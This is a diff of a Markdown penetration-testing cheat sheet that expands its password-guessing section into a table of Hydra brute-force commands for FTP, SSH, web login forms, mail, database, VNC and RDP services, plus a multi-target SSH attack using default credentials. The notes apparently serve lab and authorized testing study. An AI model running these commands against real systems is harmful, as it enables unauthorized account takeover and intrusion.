@@ -115,14 +115,29 @@ export TERM=xterm #determine type of terminal in use
 ```bash
 stty raw -echo; fg #foreground last processes in running
 ```
-#### 3.3 Password bruteforce
-- before bruteforce prefer to find a valid username because combination of bruteforce username and password is very very long
+#### 3.3 Password bruteforce  
+before bruteforce prefer to find a valid username because combination of bruteforce username and password is very very long  
+
+**Hydra services :**  
+| Service/Protocol                    | Example Command                                                                                               |
+|-------------------------------------|---------------------------------------------------------------------------------------------------------------|
+| File Transfer Protocol (FTP)        | hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100                                              | 
+| Secure Shell (SSH)                  | hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100                                               |
+| HTTP Web Services                   | hydra -l admin -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"  |
+| Simple Mail Transfer Protocol (SMTP)| hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com                                           |
+| Post Office Protocol (POP3)         | hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com                                |
+| Internet Message Access Protocol    | hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com                                |
+| MySQL Database                      | hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100                                             |
+| Microsoft SQL Server                | hydra -l sa -P /path/to/password_list.txt mssql://192.168.1.100                                               |
+| Virtual Network Computing (VNC)     | hydra -P /path/to/password_list.txt vnc://192.168.1.100                                                       |
+| Remote Desktop Protocol (RDP)       | hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100                                              |
+
+SSH multiple target
 ```bash
-hydra -l <username> -P /usr/share/worldist.txt <IP address> http-post-form "/login:login=^USER^&password=^PASS^:message_erreur" #header parameters
-#allow to brutforce http page
-hydra -s <port> -l <username> -P /usr/share/worldist.txt -t 64 -vV -f <protocol>://<adresse IP>
-#syntax of hydra, for more speed remove -t 64
+hydra -l root -p toor -M targets.txt -s 6000 ssh #target.txt= list of all user IP ssh, -s change port
 ```
+
+
 #### 3.4 Hashcracking
 - Popular type of hash :
 ```test
